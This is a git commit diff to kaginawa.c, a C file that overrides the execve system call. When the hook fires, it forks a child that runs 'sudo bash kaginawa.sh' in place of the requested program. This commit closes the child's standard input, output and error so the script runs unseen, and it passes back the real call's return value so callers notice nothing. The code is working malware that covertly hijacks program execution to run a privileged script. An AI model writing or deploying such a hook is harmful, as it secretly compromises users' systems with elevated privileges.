1a4e3914b444e43a4b1bc5a10d691cfe49999bf7
sssssSneaky <229632296+sssssSneaky@users.noreply.github.com>
2025-09-12 22:38:02 -0300

    closing fork file descriptors

--- kaginawa.c
+++ kaginawa.c
@@ -6,6 +6,13 @@
 #include <string.h>
 #include <stdlib.h>
 
+#define FALSE 0
+#define TRUE 1
+
+#define STDIN 0
+#define STDOUT 1
+#define STDERR 2
+
 static int (*original_execve)(const char *pathname, char *const argv[], char *const envp[]) = NULL;
 static char *const fake_argv[] = {"sudo", "bash", "kaginawa.sh", NULL};
 
@@ -22,12 +29,13 @@ int execve(const char *pathname, char *const argv[], char *const envp[])
 
         if (pid == 0)
         {
+            close(STDIN);
+            close(STDOUT);
+            close(STDERR);
             original_execve(pathname, &fake_argv[0], envp);
             _exit(0);
         }
     }
 
-    original_execve(pathname, argv, envp);
-
-    return 0;
+    return original_execve(pathname, argv, envp);
 }
